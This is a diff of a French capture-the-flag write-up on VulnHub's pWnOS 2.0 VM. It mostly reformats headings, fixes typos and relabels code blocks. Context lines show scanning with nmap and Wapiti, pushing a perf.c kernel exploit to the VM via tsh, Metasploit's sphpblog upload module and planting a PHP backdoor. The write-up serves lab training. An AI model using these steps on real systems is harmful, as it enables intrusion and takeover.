@@ -1,4 +1,7 @@
-# Solution du CTF pWnOS 2.0
+---
+title: "Solution du CTF pWnOS 2.0 de VulnHub"
+tags: [CTF,VulnHub]
+---
 
 pWn++
 -----
@@ -16,7 +19,7 @@ Sous *VirtualBox* vous aurez donc une manipulation similaire à faire si vous co
 Captain Obvious
 ---------------
 
-Il y a peut de surprise sur quel service va se faire exploiter :  
+Il y a peu de surprise sur quel service va se faire exploiter :  
 
 ```plain
 Nmap scan report for 10.10.10.100
@@ -43,7 +46,7 @@ Sur le port 80 il y a un site web minimaliste avec page de login et de création
 
 On lance *Wapiti* sur le site web en chargeant tous les modules habituels ainsi que plusieurs optionnels :  
 
-```plain
+```bash
 $ ./bin/wapiti http://10.10.10.100/ -m "all,nikto,backup,htaccess"
 ```
 
@@ -168,13 +171,13 @@ Sur *exploit-db* on trouve [un exploit de sd](http://www.exploit-db.com/exploits
 
 Comme la VM est en host-only je préfère envoyer directement l'exploit sur le machine via *tsh* :  
 
-```plain
+```bash
 $ ./tsh 10.10.10.100 put perf.c /tmp/
 ```
 
 Côté VM :  
 
-```plain
+```bash
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ mv /tmp/perf.c .
@@ -248,7 +251,7 @@ msf exploit(sphpblog_file_upload) > exploit
 [*] Successfully removed /images/hHzAQ3dy4VqqB2WuCJHm.php
 ```
 
-Il suffit de reprendre les idenfiants nouvellement créés, de se connecter et d'uploader nous même une backdoor PHP dans le dossier *images*.  
+Il suffit de reprendre les identifiants nouvellement créés, de se connecter et d'uploader nous même une backdoor PHP dans le dossier *images*.  
 
 Pour l'accès root on procédera de la même façon que précédemment.  
 
